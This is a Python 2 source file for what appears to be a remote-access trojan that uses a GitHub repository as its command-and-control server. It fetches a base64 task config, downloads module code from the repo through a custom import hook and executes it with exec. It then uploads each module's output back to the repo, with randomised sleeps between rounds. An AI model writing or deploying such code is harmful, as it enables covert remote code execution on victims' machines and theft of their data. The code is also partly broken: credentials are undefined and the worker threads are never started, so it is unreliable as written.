import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login

try:
    from token_data import TOKEN
except:
    TOKEN = "-"

process_id = "abc"

process_config = "%s.json" % process_id
data_path = "data/%s/" % process_id
process_modules = []
configured = False
task_queue = Queue.Queue()


def connect_to_github():
    gh = login(username=EMAIL, password=PASSWORD)
    repo = gh.repository('zelttu', 'statifier')
    branch = repo.branch("master")

    return gh, repo, branch


def get_file_contents(filepath):
    bb, repo, branch = connect_to_github()

    tree = branch.commit.commit.tree.to_tree().recurse()

    for filename in tree.tree:
        if filepath in filename.path:
            print "[*] Found file %s" % filepath
            blob = repo.blob(filename._json_data['sha'])
            return blob.content

    return None


def get_process_config():
    global configured
    config_json = get_file_contents(process_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:
        if task['module'] not in sys.modules:
            exec("import %s" % task['module'])

    return config


def store_module_result(data):
    bb, repo, branch = connect_to_github()
    remote_path = "data/%s/%d.data" % (process_id, random.randint(1000, 100000))
    repo.create_file(remote_path, "Commit message", base64.b64encode(data))

    return


def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    store_module_result(result)

    return


class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        if configured:
            print "[*] Attempting to retrieve '%s'" % fullname
            new_library = get_file_contents("modules/%s" % fullname)

            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self

        return None

    def load_module(self, name):
        module = imp.new_module(name)
        exec self.current_module_code in module.__dict__
        sys.modules[name] = module

        return module

sys.meta_path = [GitImporter()]

while True:
    if task_queue.empty():
        config = get_process_config()

        for task in config:
            t = threading.Thread(target=module_runner, args=(task['module'],))
            time.sleep(random.randint(1, 10))
    time.sleep(random.randint(1000, 10000))
